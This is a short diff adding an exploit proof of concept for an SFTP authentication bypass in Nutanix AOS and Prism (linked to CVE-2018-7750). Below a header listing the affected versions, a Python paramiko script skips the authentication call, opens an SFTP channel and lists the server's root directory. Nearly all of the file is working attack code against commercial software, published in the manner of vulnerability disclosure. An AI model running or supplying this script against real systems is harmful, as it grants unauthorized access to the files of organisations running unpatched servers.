@@ -1,0 +1,31 @@
+# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass
+# Date: 2018-10-27
+# Exploit Author: Adam Brown
+# Vendor Homepage: https://www.nutanix.org
+# Software Link: https://www.nutanix.com/products/software-options/
+# Version: < 5.5.5 (LTS), < 5.8.1 (STS)
+# Tested on: Acropolis Operating System
+# CVE : Related to CVE-2018-7750
+#
+# This PoC is based on discussions found at the following blog post:
+#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/
+# TLDR, the Acropolis SFTP server doesn't check if the client has completed the
+# authentication step before allowing the client to open channels. The PoC below
+# connects to the acropolis SFTP server, and lists the root directory without
+# authenticating.
+
+#!/usr/bin/python
+import paramiko
+
+host = '127.0.0.1'
+port = 2222
+
+trans = paramiko.Transport((host, port))
+trans.start_client()
+
+# If the call below is skipped, no username or password is required.
+# trans.auth_password('username', 'password')
+
+sftp = paramiko.SFTPClient.from_transport(trans)
+print(sftp.listdir('/'))
+sftp.close()
